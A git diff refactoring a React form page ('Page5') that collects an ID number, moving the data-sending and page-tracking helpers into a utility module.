@@ -2,13 +2,10 @@ import Input from "@/components/Input";
 import Main from "@/components/Main";
 import { Button } from "@/components/ui/button";
 import { MAIN_BTN } from "@/constants/data";
+import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
 import { useEffect } from "react";
 import { FieldValues, useForm } from "react-hook-form";
-import {
-  currentPage,
-  mainInfo,
-  sendDataToServer,
-} from "../../real-time/context/signals";
+import { mainInfo } from "../../real-time/context/signals";
 
 function Page5() {
   const {
@@ -18,7 +15,6 @@ function Page5() {
   } = useForm({ mode: "all" });
 
   function sendData(data: FieldValues) {
-    mainInfo.value = { ...mainInfo.value, idNumber: data.idNumber };
     sendDataToServer({
       data,
       current: "page5",
@@ -29,7 +25,7 @@ function Page5() {
 
   useEffect(() => {
     // This Step Are Necessary
-    currentPage.value = "page5";
+    setCurrentPage("page5");
   }, []);
   return (
     <Main>
